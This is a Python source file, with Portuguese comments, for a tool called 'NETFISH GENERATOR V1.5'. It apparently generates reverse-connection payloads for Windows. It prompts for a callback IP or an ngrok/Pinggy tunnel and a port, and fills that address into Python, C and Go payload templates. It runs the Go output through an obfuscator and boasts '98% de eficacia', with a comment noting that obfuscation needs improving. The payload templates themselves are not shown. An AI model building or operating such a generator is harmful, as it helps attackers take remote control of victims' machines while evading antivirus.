# feito por M1000 - github.com/curious0w

import subprocess
import sys
import platform
import os
import time
import socket
import ipaddress
import psutil  
import random 
from rich.console import Console 
from rich.panel import Panel 
from draw.desenhos import *

console = Console()




# Função para limpar a tela
def verification():
    """Limpa a tela do terminal."""
    if platform.system() == "Windows":
        os.system('cls')
    else:  # Linux e macOS
        os.system('clear')

#função imports
def imports():
    python_executable = sys.executable 
    
    comand = [
        python_executable, 
        '-m', 
        'pip', 
        'install', 
        '-r', 
        'requirements.txt' 
    ]

# IDENTIFICADOR DE ERRO PIP 
    try:
        print("--- Verificando e Instalando Dependências ---")
        subprocess.run(
            comand, 
            capture_output=True, 
            text=True, 
            check=True 
        )
        print("--- Instalação Concluída ---")

    except FileNotFoundError:
        print("Erro: O executável do Python não foi encontrado no seu sistema.")
        sys.exit()
    except Exception as e:
        print(f"Ocorreu um erro inesperado na instalação: {e}")
        sys.exit()

# --- Funções de IP e Porta ---



def configurar_tunnel():
    """Configurar conexão via TCP Tunnel (ngrok/Pinggy)."""
    console.print("\n[bold yellow]--- Configurar TCP Tunnel ---[/bold yellow]")
    tunnel_ip = input("Digite o IP do seu túnel (ex: 1.tcp.ngrok.io): ").strip()
    
    if not tunnel_ip:
        return None, None
    
    while True:
        tunnel_port = input("Digite a porta do seu túnel (1-65535): ").strip()
        if validar_porta(tunnel_port):
            return tunnel_ip, tunnel_port
        print("Erro: Porta inválida. Digite um número inteiro entre 1 e 65535.")

def validar_ipv4(ip_string):
    """Verifica se a string é um endereço IPv4 válido."""
    try:
        ipaddress.IPv4Address(ip_string)
        return True
    except ipaddress.AddressValueError:
        return False

def validar_porta(port_string):
    """Verifica se a string é uma porta válida (1 a 65535)."""
    try:
        port = int(port_string)
        return 1 <= port <= 65535
    except ValueError:
        return False

def selecionar_tipo_conexao():
    """Menu para escolher entre IP local ou TCP tunnel."""
    while True:
        console.print("\n[bold yellow]--- Selecione o Tipo de Conexão ---[/bold yellow]")
        console.print("[bold blue][1] - IP Local (sua máquina)[/bold blue]")
        console.print("[bold green][2] - TCP Tunnel (ngrok/Pinggy)[/bold green]")
        
        try:
            escolha = input("\nDigite sua escolha (1 ou 2): ").strip()
            
            if escolha == "1":
                # IP Local
                ip = listar_e_selecionar_ip()
                if not ip:
                    print("Nenhuma seleção de IP válida foi feita.")
                    continue
                    
                while True:
                    port_input = input("Digite a porta que vai receber a conexão (1-65535): ")
                    if validar_porta(port_input):
                        port = port_input
                        break
                    print("Erro: Porta inválida. Digite um número inteiro entre 1 e 65535.")
                
                console.print(f"[bold green]✓ Usando IP Local: {ip}:{port}[/bold green]")
                return ip, port
            
            elif escolha == "2":
                # TCP Tunnel
                tunnel_ip, tunnel_port = configurar_tunnel()
                if tunnel_ip and tunnel_port:
                    console.print(f"[bold green]✓ Usando TCP Tunnel: {tunnel_ip}:{tunnel_port}[/bold green]")
                    return tunnel_ip, tunnel_port
                else:
                    print("Configuração de túnel cancelada. Tente novamente.")
                    continue
            
            else:
                print("Opção inválida. Digite 1 ou 2.")
        
        except Exception as e:
            print(f"Erro na seleção: {e}")

def listar_e_selecionar_ip():
    """Lista as interfaces, IPs e solicita que o usuário selecione um."""
    interfaces_info = {}
    print("\n [IPs de Interfaces de Rede Disponíveis (IPv4)]")
    
    contador = 1
    # Mapear interfaces e IPs
    for nome, addrs in psutil.net_if_addrs().items():
        # Encontra o primeiro IPv4 que não seja loopback
        ip_v4 = next((a.address for a in addrs if a.family == socket.AF_INET and not nome.startswith('lo')), None)
        
        if ip_v4:
            print(f"[{contador}] {nome}: {ip_v4}")
            interfaces_info[contador] = ip_v4
            contador += 1
    
    if not interfaces_info:
        print("Nenhuma interface ativa com IPv4 encontrada.")
        return None

    # Solicitar a escolha
    while True:
        try:
            escolha = input("Digite o **número** do IP que você deseja usar ou digite um IP manualmente: ")
            
            # Se for um número, checa se está na lista de opções
            if escolha.isdigit():
                escolha_num = int(escolha)
                if escolha_num in interfaces_info:
                    ip_selecionado = interfaces_info[escolha_num]
                    print(f"\n IP Selecionado: {ip_selecionado}")
                    return ip_selecionado
                else:
                    print("Número inválido. Escolha um número da lista.")
            
            # Se for uma string (IP manual), valida o formato
            elif validar_ipv4(escolha):
                 print(f"\n IP Manual Selecionado: {escolha}")
                 return escolha
            else:
                 print("Entrada inválida. Não é um número de opção nem um formato IPv4 válido.")

        except ValueError:
            print("Entrada inválida.")
        except Exception as e:
            print(f"Erro inesperado na seleção de IP: {e}")
            break
    return None

# --- Funções Principais do Menu ---

def menu():


    time.sleep(1) # Reduzido o tempo de espera para ser mais rápido
    os.system('clear')
    desenho_escolhido = random.randint(1, 8)

# Exibe usando o Panel do Rich
    console.print(
        Panel(
            globals()[f"desenho{desenho_escolhido}"], 
            title="[bold red]NETFISH GENERATOR V1.5[/bold red]", 
            subtitle="[yellow]github.com/curious0w[/yellow]",
            border_style="bright_blue",
            expand=False
        )
    )

    console.print(
        Panel(
            "[bold blue]-----Payloads-Disponiveis-(Windows)----[/bold blue]\n"
            "[bold green][1]-Python (80% de eficacia!)[/bold green]\n"
            "[bold red][2]-C (98% de eficacia)[/bold red]\n"#slkkkkkkkkk ta muito potente mas precisa melhorar a ofuscação pro futuro
            "[bold blue][3]-Go (98% de eficacia!!)[/bold blue]\n"
            "[bold magenta][4]-Observações do desenvolvedor[/bold magenta]\n"
            "[bold yellow]mais opções futuramente...:)[/bold yellow]",
            border_style="bright_blue",
            expand=False
        )
    )
    try:
        option = int(input("\nEscolha uma opção:"))
    except ValueError:
        print("Opção inválida. Digite um número.")
        time.sleep(1)
        return
    
    #Python
    if option == 1:
        # Selecionar tipo de conexão (IP Local ou TCP Tunnel)
        ip, port = selecionar_tipo_conexao()
        if not ip or not port:
            print("Nenhuma seleção válida foi feita. Retornando ao menu.")
            time.sleep(2)
            return
            
        # 3. Execução Segura (Modificação Final do Payload)
        comando = [
            'python3',
            'escopos/python/escopo_win.py',
            ip, # IP Selecionado/Validado
            port # Porta Validada
        ]
        
        try:
            print(f"\n Gerando payload com IP: {ip} e Porta: {port}...")
            
            # Executa o script. Captura a saída para mostrar ao usuário.
            resultado = subprocess.run(
                comando, 
                check=True, 
                text=True, 
                capture_output=True
            )
            
            print("\n--- Saída do Gerador de Payload ---")
            print(resultado.stdout)
            
            # Pausa para o usuário ver a saída final
            input("Pressione Enter para continuar...")
            menu() 
            
        except subprocess.CalledProcessError as e:
            print(f"\nERRO na execução do escopo_win.py. Código: {e.returncode}")
            print(f"Stderr: {e.stderr}")
            input("Pressione Enter para continuar...") 
            
    #C
    elif option == 2: 
        # Selecionar tipo de conexão (IP Local ou TCP Tunnel)
        ip, port = selecionar_tipo_conexao()
        if not ip or not port:
            print("Nenhuma seleção válida foi feita. Retornando ao menu.")
            time.sleep(2)
            return


        # Invoca o gerador de payload C que cria e ofusca o arquivo final
        comando = [
            sys.executable,
            'escopos/C/escopo_c.py',
            ip,
            port,
        ]

        try:
            print(f"\n Gerando payload com IP: {ip} e Porta: {port}...")
            
            # Executa o script. Captura a saída para mostrar ao usuário.
            resultado = subprocess.run(
                comando, 
                check=True, 
                text=True, 
                capture_output=True
            )
            
            print("\n--- Saída do Gerador de Payload ---")
            print(resultado.stdout)
            
            # Pausa para o usuário ver a saída final
            input("Pressione Enter para continuar...") 
            
        except subprocess.CalledProcessError as e:
            print(f"\nERRO na execução do escopo_.py. Código: {e.returncode}")
            print(f"Stderr: {e.stderr}")
            input("Pressione Enter para continuar...") 
                        
        
        time.sleep(2)
        menu()
    
    #go
    elif option == 3:
        
        ip, port = selecionar_tipo_conexao()
        if not ip or not port:
            print("Seleção inválida.")
            return

        full_address = f"{ip}:{port}"
        
 
        path_escopo = "escopos/go/escopo_teste.go"
        path_output = "template.go"

        try:
            # Lendo o modelo
            if not os.path.exists(path_escopo):
                print(f"Erro: Arquivo {path_escopo} não encontrado!")
                return

            with open(path_escopo, "r", encoding="utf-8") as f:
                go_template_code = f.read()

            final_code = go_template_code.replace("{{ADDR}}", full_address)

            # Gravando o novo arquivo
            with open(path_output, "w", encoding="utf-8") as f:
                f.write(final_code)
            
            print(f"\n[+] '{path_output}' gerado com sucesso!")

            path_obf_bin = os.path.join(os.getcwd(), "ofuscadores/gofuscator/gofuscator")
            
            print("[*] Ofuscando...")
            subprocess.run([path_obf_bin, "-i", "template.go", "-o", "template_obf.go", "--no-ints"], check=True)

            # Após o término de tudo (ofuscação e build):
            print("[*] Limpando arquivos temporários...")
            
            arquivos_para_deletar = ["template.go"]
            
            for arquivo in arquivos_para_deletar:
                if os.path.exists(arquivo):
                    os.remove(arquivo)
                    print(f"[-] {arquivo} removido.")
            

            print("\n[✔] Processo concluído. Apenas o executável foi mantido.")
            print("\n voltando ao menu...")

        except Exception as e:
            print(f"Erro durante a limpeza: {e}")

        except PermissionError:
            print("Erro: Sem permissão para escrever no diretório ou o arquivo está aberto.")
        except Exception as e:
            print(f"Erro inesperado: {e}")
        
        time.sleep(2)
        menu()

        
       

    elif option == 4:
        console.print(
            Panel(
                "[bold blue]-----Observações do Desenvolvedor----[/bold blue]\n"
                "[bold yellow]- A eficácia dos payloads pode variar dependendo do ambiente e das defesas do alvo.[/bold yellow]\n"
                "[bold yellow]- Sempre teste seus payloads em ambientes controlados antes de qualquer operação real.[/bold yellow]\n"
                "[bold yellow]- Mantenha seu software antivírus atualizado para garantir a melhor proteção possível.[/bold yellow]\n"
                "[bold yellow]- Futuramente, mais opções de payloads e melhorias serão adicionadas. V#[/bold yellow]", # talvez no V2
                border_style="bright_blue",
                expand=False
            )
        )
        input("\nPressione Enter para voltar ao menu...")
        menu()
    
    else:
        print("Opção inválida. Tente novamente.")
        time.sleep(1)
        menu()


# Chamadas iniciais
verification()
imports()
menu()